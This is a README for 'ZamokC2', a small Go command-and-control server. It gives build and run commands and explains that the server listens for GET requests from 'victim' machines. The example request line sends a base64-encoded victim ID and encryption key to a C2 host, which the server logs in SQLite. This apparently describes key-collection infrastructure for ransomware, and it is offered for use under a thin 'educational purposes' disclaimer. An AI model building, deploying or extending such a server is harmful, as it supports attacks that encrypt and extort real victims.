# ZamokC2
A simple but effective C2 Server for Zamok

## Setup :
- Clone this repository
- Navigate to the project directory and run :
    ```
    go get
    ```
- To build the C2, run :
    ```
    go build -o zamokc2
    ```
## You can now start it by simply running :
    ```
    ./zamokc2
    ```

## How it works :
1. Starts a listener on port 8080 (the default one; you can change it)
2. It expects a GET request from the target/victim 
3. The GET request is like this :
    ```
    GET http://c2.server:8080/<SOME_STRING>
    ```
    Where :
    - SOME_STRING is a base64 string of a unique victim machine id and the encryption/decryption key concatenated with a :
4. The C2 breaks down the request and gets the 2 values : the id and the key
5. It saves these values to an SQLite database locally 
6. It displays a banner on the terminal, with the details of the new victim machine

## Warning :
This project is for educational purposes only, and I will not be responsible for \
anything malicious you do with it 